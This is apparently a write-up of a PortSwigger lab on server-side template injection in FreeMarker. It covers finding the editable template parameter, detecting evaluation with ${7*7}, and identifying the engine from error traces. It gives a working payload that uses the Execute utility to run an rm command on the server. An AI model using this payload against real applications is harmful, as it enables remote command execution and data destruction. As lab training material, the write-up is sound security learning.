# Server-side template injection using documentation — Walkthrough

<img width="1920" height="1080" alt="screenshot_20260825_062559" src="https://github.com/user-attachments/assets/22b3b4f3-180f-4d74-b320-915e2df0260d" />



## 1. Find the template functionality

After logging into the lab, open a product and look for the option that allows the product template to be edited.

The interesting request is:


<img width="1920" height="1080" alt="screenshot_20260825_065122" src="https://github.com/user-attachments/assets/1b0bf72b-9f6e-4c63-a6e3-97fd4def4b6e" />

The request contains a `template` parameter:

```text
csrf=...
&template=...
&template-action=save
```

The original template contains expressions such as:

```text
${product.stock}
${product.price}
```

That `${...}` syntax is an important clue.
<img width="1920" height="1080" alt="screenshot_20260825_065050" src="https://github.com/user-attachments/assets/69fb3930-e5cd-40f8-a4cd-95ba66f3ca04" />



<img width="1920" height="1080" alt="screenshot_20260825_070203" src="https://github.com/user-attachments/assets/cae9ccf2-7823-46d9-a5e1-c2bb05d4de58" />

---

## 2. Test for SSTI

Modify the template and replace some harmless content with:

```text
${7*7}
```
<img width="1920" height="1080" alt="screenshot_20260825_070853" src="https://github.com/user-attachments/assets/6eb93ff4-e69d-4342-9160-903c5789e5c7" />

For example:


Send the request.



If the template is evaluated, the page should contain:

```text
49
```

instead of:

```text
${7*7}
```

This confirms that the server is evaluating our input as a template.

---

## 3. Identify the template engine

A particularly useful mistake in the request produced this error:

```text
FreeMarker template error
```
<img width="1867" height="636" alt="screenshot_20260825_070203 (Edited)" src="https://github.com/user-attachments/assets/60deb1a2-fba4-45fb-9eee-78131c6cb8df" />

The stack trace also contained:

```text
freemarker.core.InvalidReferenceException
```

and:

```text
lab.actions.templateengines.FreeMarker.processInput
```

Therefore, the template engine is **FreeMarker**.

This is much better than guessing payload syntax because we now know exactly which template engine's documentation to investigate.

---

## 4. Use the FreeMarker documentation

The lab is called **“Server-side template injection using documentation”** because the intended technique is to use FreeMarker's documented functionality rather than blindly guessing an SSTI payload.

FreeMarker provides the `new` built-in, which can instantiate certain Java classes.

The relevant utility is:

```text
freemarker.template.utility.Execute
```

This class can execute an operating-system command.

The resulting FreeMarker expression is:

```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}
```

### What this does

The first part:

```text
<#assign ex="freemarker.template.utility.Execute"?new()>
```

creates an instance of FreeMarker's `Execute` utility and stores it in the variable `ex`.

Then:

```text
${ex("rm /home/carlos/morale.txt")}
```

calls that object with the command:

```text
rm /home/carlos/morale.txt
```

So the server executes the command in the context of the lab.

---

## 5. Submit the final payload

Replace the product template with:

```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}
```
<img width="1887" height="742" alt="screenshot_20260825_070948 (Edited)" src="https://github.com/user-attachments/assets/271096ea-8d44-4a9c-92ad-8d3682ee6bf9" />

Then submit/save the template.





## 6. Lab solved

Once the command successfully executes and `morale.txt` is deleted, the PortSwigger lab should change from:

```text
Not solved
```

to:

```text
Solved
```
<img width="1920" height="1080" alt="screenshot_20260825_070948" src="https://github.com/user-attachments/assets/7ee36dd6-ee8f-4e67-bf78-745d0bc68115" />

---

